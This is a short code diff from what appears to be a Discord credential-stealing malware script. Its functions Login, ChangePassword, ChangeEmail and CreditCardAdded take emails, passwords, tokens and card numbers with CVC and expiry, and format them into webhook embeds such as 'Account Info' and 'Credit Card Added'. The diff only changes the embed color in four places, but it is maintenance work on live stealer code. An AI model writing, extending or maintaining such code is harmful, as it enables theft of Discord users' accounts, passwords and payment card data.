@@ -145,7 +145,7 @@ function Login(email, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/941125672196263957/941125702000984064/Black_Joker.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 000000,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -187,7 +187,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/941125672196263957/941125702000984064/Black_Joker.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 000000,
                     "fields": [
                         {
                             "name": "**Password Changed**",
@@ -234,7 +234,7 @@ function ChangeEmail(newemail, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/941125672196263957/941125702000984064/Black_Joker.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 000000,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -281,7 +281,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/941125672196263957/941125702000984064/Black_Joker.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 000000,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
